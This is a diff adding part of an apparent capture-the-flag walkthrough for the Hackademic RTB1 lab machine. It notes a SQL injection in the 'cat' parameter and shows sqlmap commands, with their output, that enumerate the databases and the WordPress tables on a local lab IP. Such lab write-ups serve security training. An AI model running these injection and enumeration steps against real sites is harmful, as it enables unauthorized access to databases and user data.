@@ -43,8 +43,60 @@ MAC Address: 00:0C:29:F6:75:CB (VMware)
 
 Visit the main page and if you click on `Uncategorized` link on the bottom of the page a new url parameter will be used `cat=1`
 
-this paramter is vulnerable to sql injection
 
+
+this paramter is vulnerable to sql injection if you put a `"` after it :
+
+
+
+
+
+
+
+
+
+
+
+
+i tried with `sqlmap` to inject into this paramter and get the database :
+
+```bash
+root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs
+
+...
+back-end DBMS: MySQL >= 5.0
+[05:03:56] [INFO] fetching database names
+[05:03:56] [INFO] resumed: 'information_schema'
+[05:03:56] [INFO] resumed: 'mysql'
+[05:03:56] [INFO] resumed: 'wordpress'
+available databases [3]:
+[*] information_schema
+[*] mysql
+[*] wordpress
+...
+```
+
+all we need here is to get information from `wordpress` database.
+
+- Get tables from this database :
+
+```bash
+root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs -D wordpress --tables
+
+Database: wordpress
+[9 tables]
++-------------------+
+| wp_categories     |
+| wp_comments       |
+| wp_linkcategories |
+| wp_links          |
+| wp_options        |
+| wp_post2cat       |
+| wp_postmeta       |
+| wp_posts          |
+| wp_users          |
++-------------------+
+```
 
 
 
